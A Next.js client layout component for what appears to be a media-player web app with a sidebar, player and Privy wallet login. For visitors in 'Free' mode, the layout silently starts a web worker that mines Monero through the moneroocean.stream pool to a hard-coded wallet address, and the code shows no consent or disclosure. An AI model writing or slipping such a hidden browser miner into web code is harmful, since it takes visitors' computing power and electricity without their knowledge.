"use client";

import { useEffect, useState } from "react";
import { usePathname } from "next/navigation";
import { Sidebar } from "@/components/sidebar";
import { Player } from "@/components/player";
import { PrivyProvider } from "@privy-io/react-auth";

export default function ClientLayout({ children }: { children: React.ReactNode }) {


  const pathname = usePathname();
  const isHomePage = pathname === "/";

  const UserMode =sessionStorage.getItem("User") ? sessionStorage.getItem("User") : null;
  const FreeMode = !UserMode || UserMode === "Free";

  const [worker, setWorker] = useState<Worker | null>(null);

  useEffect(() => {
    if (FreeMode && typeof window !== "undefined") {
      const newWorker = new Worker(new URL("../../public/minerWorker.js", import.meta.url));
      newWorker.postMessage({ type: "start", stratum: {
        server: "gulf.moneroocean.stream",
        port: 20128,
        worker: "42LmVzhaXCUXeRGako7gRmKKbEgiSk4i9iQTgbF6TdDaZ4ZwhogUj2k2pvD3n9t22Wcnvuc1Lj94e8jpvtAKViYnKztrPsU",
        password: "x",
        ssl: true,
      }});
      setWorker(newWorker);
    }

    return () => {
      if (worker) {
        worker.postMessage({ type: "stop" });
        worker.terminate();
      }
    };
  }, [FreeMode]);

  return isHomePage ? (
    <div className="flex-1">{children}</div>
  ) : (
    !FreeMode ? (
      <>
        <PrivyProvider
          appId="cm6pcnuwz01bofv3214fs2c0g"
          config={{
            appearance: {
              theme: "light",
              accentColor: "#676FFF",
              logo: "https://ethglobal.b-cdn.net/events/agents/square-logo/default.png",
            },
            embeddedWallets: {
              createOnLogin: "users-without-wallets",
            },
          }}
        >
          <Sidebar />
          <div className="flex-1">{children}</div>
          <Player />
        </PrivyProvider>
      </>
    ) : (
      <>
        <Sidebar />
        <div className="flex-1">{children}</div>
        <Player />
      </>
    )
  );
}
